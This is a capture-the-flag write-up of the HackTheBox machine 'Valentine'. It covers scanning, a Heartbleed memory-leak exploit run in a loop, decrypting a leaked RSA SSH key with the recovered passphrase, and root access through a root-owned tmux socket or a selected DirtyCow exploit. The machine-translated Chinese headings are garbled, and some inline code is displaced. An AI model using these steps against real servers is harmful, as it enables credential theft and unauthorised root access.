# 情人节：情人节

[0xdf.gitlab.io](https://0xdf.gitlab.io/2018/07/28/htb-valentine.html)0xdf黑客的东西

瓦伦丁是我破解盒子的第一批主人之一。我们将使用心脏出血来获取通过枚举找到的 SSH 密钥的密码。有两种途径可以实现私有化，但我非常偏向于使用根 tmux 会话。对于HTB来说，这个盒子非常容易。

*   n地图
    *   扫描结果
    *   操作系统检测
*   网站 - 端口 443
    *   网站
    *   心脏出血漏洞利用
        *   说明 / 借口显示 xkcd
        *   运行漏洞利用
    *   戈克斯特
    *   注释.txt
    *   hype\_key
*   固态混合硬盘访问
*   私人
    *   Privesc 1： tmux 作为根运行
    *   私人2：肮脏的牛

## n地图

### 扫描结果

初始 nmap 显示 ssh、http、https 和 udp 5353：

    # Nmap 7.60 scan initiated Wed Mar 14 09:19:58 2018 as: nmap -vvv -sT -p- --min-rate 5000 --max-retries 1 -oA nmap/alltcp 10.10.10.79
    Warning: 10.10.10.79 giving up on port because retransmission cap hit (1).
    Nmap scan report for 10.10.10.79
    Host is up, received echo-reply ttl 63 (0.099s latency).
    Scanned at 2018-03-14 09:19:58 EDT for 19s
    Not shown: 48050 closed ports, 17482 filtered ports
    Reason: 48050 conn-refused and 17482 no-responses
    PORT    STATE SERVICE REASON
    22/tcp  open  ssh     syn-ack
    80/tcp  open  http    syn-ack
    443/tcp open  https   syn-ack
    
    Read data files from: /usr/bin/../share/nmap
    # Nmap done at Wed Mar 14 09:20:17 2018 -- 1 IP address (1 host up) scanned in 18.89 seconds
    
    root@kali:~/hackthebox/valentine-10.10.10.79# grep -v -e "closed" -e "no-response" nmap/alludp.nmap
    # Nmap 7.60 scan initiated Wed Mar 14 09:20:30 2018 as: nmap -vvv -sU -p- --min-rate 5000 --max-retries 1 -oA nmap/alludp 10.10.10.79
    Warning: 10.10.10.79 giving up on port because retransmission cap hit (1).
    Increasing send delay for 10.10.10.79 from 0 to 50 due to 11 out of 19 dropped probes since last increase.
    Nmap scan report for 10.10.10.79
    Host is up, received reset ttl 63 (0.10s latency).
    Scanned at 2018-03-14 09:20:30 EDT for 26s
    
    PORT      STATE         SERVICE           REASON
    5353/udp  open          zeroconf          udp-response ttl 254
    
    Read data files from: /usr/bin/../share/nmap
    # Nmap done at Wed Mar 14 09:20:57 2018 -- 1 IP address (1 host up) scanned in 27.55 seconds
    

使用脚本获取有关端口的更多详细信息：

    root@kali:~/hackthebox/valentine-10.10.10.79# nmap -sC -sV -oA nmap/initial 10.10.10.79
    
    Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-14 09:23 EDT
    Nmap scan report for 10.10.10.79
    Host is up (0.12s latency).
    Not shown: 997 closed ports
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
    |   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
    |_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
    80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
    |_http-title: Site doesn't have a title (text/html).
    443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
    |_http-server-header: Apache/2.2.22 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    | ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
    | Not valid before: 2018-02-06T00:45:25
    |_Not valid after:  2019-02-06T00:45:25
    |_ssl-date: 2018-03-14T13:24:02+00:00; 0s from scanner time.
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 95.97 seconds
    
    root@kali:~/hackthebox/valentine-10.10.10.79# nmap -sC -sV -sU -p 5353 -oA nmap/udp5353 10.10.10.79
    
    Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-14 09:26 EDT
    Nmap scan report for 10.10.10.79
    Host is up (0.098s latency).
    
    PORT     STATE SERVICE VERSION
    5353/udp open  mdns    DNS-based service discovery
    | dns-service-discovery:
    |   9/tcp workstation
    |     Address=10.10.10.79 dead:beef:0:0:250:56ff:feb9:7dfb
    |   22/tcp udisks-ssh
    |_    Address=10.10.10.79 dead:beef:0:0:250:56ff:feb9:7dfb
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds
    

### OS Detection

`nmap` says this is Ubuntu. The ssh version of “OpenSSH 5.9p1” looks old. Googling for it finds a [launchpad site](https://launchpad.net/ubuntu/+source/openssh/1:5.9p1-5ubuntu1.9) with the distro:

![1532726227781](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1532726227781.png)

The [Ubuntu wiki releases page](https://wiki.ubuntu.com/Releases) shows that Precise Pangolin was Ubuntu 12.04, and went end of line by April 28, 2017.

## Website - port 443

### Site

Both the http and https sites are just an image: That is definitely the heartbleed logo. Pretty strong suggestion to look for heartbleed.`<center><img src="omg.jpg"/></center>`![omg.jpg](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fomg.jpg)

### Heartbleed exploit

#### Explanation / Excuse to Show xkcd

Heartbleed is a logic error that allowed an attacker to grab chunks of random memory that they shouldn’t have had access to.

There’s no better explanation of Heartbleed than [xkcd’s](https://xkcd.com/1354/):

![Are you still there, server? It's me, Margaret.](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fxkcd-heartbleed_explaination.png)

#### Running Exploit

Grab a script to exploit:

    root@kali:~/hackthebox/valentine-10.10.10.79# searchsploit heartbleed
    -------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
     Exploit Title                                                                                                                              |  Path
                                                                                                                                                | (/usr/share/exploitdb/)
    -------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                                         | exploits/multiple/remote/32764.py
    OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                         | exploits/multiple/remote/32791.c
    OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                          | exploits/multiple/remote/32998.c
    OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                            | exploits/multiple/remote/32745.py
    -------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
    Shellcodes: No Result
    
    root@kali:~/hackthebox/valentine-10.10.10.79# searchsploit -m exploits/multiple/remote/32745.py
      Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure
          URL: https://www.exploit-db.com/exploits/32745/
         Path: /usr/share/exploitdb/exploits/multiple/remote/32745.py
    File Type: Python script, ASCII text executable, with CRLF line terminators
    
    Copied to: ~/hackthebox/valentine-10.10.10.79/32745.py
    

The script runs and grabs memory from the target server (it’s useful to remove lines of 0):

    root@kali:~/hackthebox/valentine-10.10.10.79# python 32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
    Trying SSL 3.0...
    Connecting...
    Sending Client Hello...
    Waiting for Server Hello...
     ... received message: type = 22, ver = 0300, length = 94
     ... received message: type = 22, ver = 0300, length = 885
     ... received message: type = 22, ver = 0300, length = 331
     ... received message: type = 22, ver = 0300, length = 4
    Sending heartbeat request...
     ... received message: type = 24, ver = 0300, length = 16384
    Received heartbeat response:
      0000: 02 40 00 D8 03 00 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
      0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
      0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
      0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
      0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
      0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
      0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
      0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
      0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
      0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
      00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
      00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
      00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
      00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 BF 6B 6E 41  ....#........knA
      00e0: 39 66 FE 4D BC F2 D4 12 DD 9E 97 59 61 A9 1D 4D  9f.M.......Ya..M
      00f0: 77 11 D3 8B 4F 11 AD 87 2F 50 B9 4E 13 E7 92 86  w...O.../P.N....
      0100: F1 0B 04 3B 97 CB 19 00 0B 00 0C 00 18 00 09 00  ...;............
      0110: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
      0120: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
      0130: 10 00 11 00 23 00 00 00 0D 00 20 00 1E 06 01 06  ....#..... .....
      0140: 02 06 03 05 01 05 02 05 03 04 01 04 02 04 03 03  ................
      0150: 01 03 02 03 03 02 01 02 02 02 03 00 0F 00 01 01  ................
      0160: 00 15 00 9C 00 00 00 00 00 00 00 00 00 00 00 00  ................
    
    WARNING: server returned more data than it should - server is vulnerable!
    

I ran it a ton of times to collect a bunch of data: `for i in $(seq 1 100000); do python 32764.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > data_dump/data_dump$i; done`

The use fdupes to remove duplicates:

    apt install fdupes
    fdupes -rf . | grep -v '^$' > files
    xargs -a files rm -v
    

In this data, there were a few interesting bits:

*   The existence of and `/encode.php``/decode.php`
*   `decode.php..Content-Type: application/x-www-form-urlencoded..Content-Length: 42....$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`
    *   that decodes to `heartbleedbelievethehype`
*   something that looked like an md5, but didn’t crack easily

### gobuster

After collecting a lot of data but seeing no clear way forward, get back to enumeration. gobuster:

    root@kali:~/hackthebox/valentine-10.10.10.79# gobuster -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
    
    Gobuster v1.4.1              OJ Reeves (@TheColonial)
    =====================================================
    =====================================================
    [+] Mode         : dir
    [+] Url/Domain   : http://10.10.10.79/
    [+] Threads      : 10
    [+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes : 200,204,301,302,307
    [+] Extensions   : .txt,.php,.html
    =====================================================
    /index (Status: 200)
    /index.php (Status: 200)
    /dev (Status: 301)
    /encode (Status: 200)
    /encode.php (Status: 200)
    /decode (Status: 200)
    /decode.php (Status: 200)
    /omg (Status: 200)
    

`/dev` allows dir list, and has two files, and `hype_key``notes.txt`

### notes.txt

    To do:
    
    1) Coffee.
    2) Research.
    3) Fix decoder/encoder before going live.
    4) Make sure encoding/decoding is only done client-side.
    5) Don't use the decoder/encoder until any of this is done.
    6) Find a better way to take notes.
    

This hints that sensitive data may be going in and out of the decoder. That’s an indication that the string we found earlier might be important.

### hype\_key

The file is a bunch of hex bytes.

    2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
    

Grab it, and it decodes to an encrypted RSA cert:

    root@kali:~/hackthebox/valentine-10.10.10.79# wget https://10.10.10.79/dev/hype_key --no-check-certificate
    --2018-03-17 15:59:45--  https://10.10.10.79/dev/hype_key
    Connecting to 10.10.10.79:443... connected.
    WARNING: The certificate of ‘10.10.10.79’ is not trusted.
    WARNING: The certificate of ‘10.10.10.79’ hasn't got a known issuer.
    The certificate's owner does not match hostname ‘10.10.10.79’
    HTTP request sent, awaiting response... 200 OK
    Length: 5383 (5.3K)
    Saving to: ‘hype_key’
    
    hype_key                                      100%[==============================================================================================>]   5.26K  --.-KB/s    in 0s
    
    2018-03-17 15:59:45 (38.7 MB/s) - ‘hype_key’ saved [5383/5383]
    
    root@kali:~/hackthebox/valentine-10.10.10.79# cat hype_key | xxd -r -p
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
    
    DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
    5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
    0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
    Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
    OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
    pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
    QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
    p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
    Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
    t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
    XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
    aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
    +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
    AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
    r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
    2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
    e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
    09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
    dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
    cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
    pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
    Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
    suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
    l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
    RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
    -----END RSA PRIVATE KEY-----
    
    root@kali:~/hackthebox/valentine-10.10.10.79# cat hype_key | xxd -r -p > hype_key_encrypted
    

We can use openssl to try to decrypt. It asks for a password… the decode of the base64 collected with heartbleed, works:`heartbleedbelievethehype`

    root@kali:~/hackthebox/valentine-10.10.10.79# openssl rsa -in hype_key_encrypted -out hype_key_decrypted
    Enter pass phrase for hype_key_encrypted:
    writing RSA key
    

## SSH Access

With the decrypted key, ssh in as , given the file name:`hype`

    root@kali:~/hackthebox/valentine-10.10.10.79# ssh -i ~/hype_key_decrypted hype@10.10.10.79
    Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com/
    
    New release '14.04.5 LTS' available.
    Run 'do-release-upgrade' to upgrade to it.
    
    Last login: Fri Feb 16 14:16:34 2018 from 10.10.14.3
    hype@Valentine:~$ pwd
    /home/hype
    

This banner confirms the OS identification from nmap as Ubuntu 12.04.

Now we can grab user.txt:

    hype@Valentine:~$ find . -name user.txt -exec wc -c {} \; -exec cat {} \;
    33 ./Desktop/user.txt
    e6710a54...
    

## Privesc

There’s two clear paths to root here. Despite the fact that it’s been quite obvious that this is an older kernel, we’ll start with the more elegant one, since kernel exploits should be a last resort.

### Privesc 1: tmux Running as root

We see signed of tmux in a few places.

Process list, running as root:

    hype@Valentine:~$ ps -ef | grep tmux
    root       1022      1  0 Jul25 ?        00:00:54 /usr/bin/tmux -S /.devs/dev_sess
    

bash history:

    hype@Valentine:~$ history
        1  exit
        2  exot
        3  exit
        4  ls -la
        5  cd /
        6  ls -la
        7  cd .devs
        8  ls -la
        9  tmux -L dev_sess
       10  tmux a -t dev_sess
       11  tmux --help
       12  tmux -S /.devs/dev_sess
       13  exit
       14  tmux ls
       15  ps -ef
       16  ps -ef |grep tmux
       17  uname -a
       18  tmus
       19  tmux
       20  tmux ls
       21  history
    

If we just run , we’ll see no active sessions.`tmux ls`

    hype@Valentine:~$ tmux ls
    failed to connect to server: Connection refused
    

But as we see in the history file, the and flags are used:`-L``-S`

>      -S socket-path
>                    Specify a full alternative path to the server socket.  If -S is specified, the default socket directory is not used and any -L flag
>                    is ignored.
>      -L socket-name
>                    tmux stores the server socket in a directory under /tmp (or TMPDIR if set); the default socket is named default.  This option
>                    allows a different socket name to be specified, allowing several independent tmux servers to be run.  Unlike -S a full path is not
>                    necessary: the sockets are all created in the same directory.
>                    If the socket is accidentally removed, the SIGUSR1 signal may be sent to the tmux server process to recreate it.
>     

That is to say, in line 5-7 of the history, the user goes into the directory. In line 9 we see him start tmux session with the socket . He tried to attach to that session with (line 10), but that’s not the correct way to do it. Then he runs the help command (line 11), and gets the correct way to connect, using (line 12).`/.devs``dev_sess``-a t dev_sess``-S`

If we look at the permissions for the socket, it’s owned by room, but its group is hype, and the file is readable by group:

    hype@Valentine:~$ ls -l /.devs
    total 0
    srw-rw---- 1 root hype 0 Jul 25 15:07 dev_sess
    

We can connect to the session the same way hype did, with : `-S`![1532741669699](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2F1532741669699.png)

In the picture, you’ll see the tmux session I was running on my kali, and inside that the tmux session on Valentine.

Grab root.txt:

    root@Valentine:/home/hype# id
    uid=0(root) gid=0(root) groups=0(root)
    root@Valentine:/home/hype# cat /root/root.txt
    f1bb6d75...
    

### Privesc 2: DirtyCow

We already suspect that this is an old kernel. confirms it:`uname -a`

    hype@Valentine:~$ uname -a
    Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
    

[Wikipedia](https://en.wikipedia.org/wiki/Dirty_COW) confirms this version is vulnerable to DirtyCow. There’s a few options in searchsploit:

    root@kali:/opt/linux_privesc# searchsploit dirty
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
     Exploit Title                                                                                                                                                                      |  Path
                                                                                                                                                                                        | (/usr/share/exploitdb/)
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
    Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page                                                                                                                  | exploits/linux/dos/43199.c
    Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)                                                                  | exploits/linux/local/40616.c
    Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                                                                     | exploits/linux/local/40847.cpp
    Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                                                                                        | exploits/linux/local/40838.c
    Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                                                                  | exploits/linux/local/40839.c
    Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)                                                                                         | exploits/linux/local/40611.c
    Quick and Dirty Blog (qdblog) 0.4 - 'categories.php' Local File Inclusion                                                                                                           | exploits/php/webapps/4603.txt
    Quick and Dirty Blog (qdblog) 0.4 - SQL Injection / Local File Inclusion                                                                                                            | exploits/php/webapps/3729.txt
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
    Shellcodes: No Result
    

After looking over a few, selected one that would add a root user to the passwd file:

    root@kali:~/hackthebox/valentine-10.10.10.79# searchsploit -m exploits/linux/local/40839.c
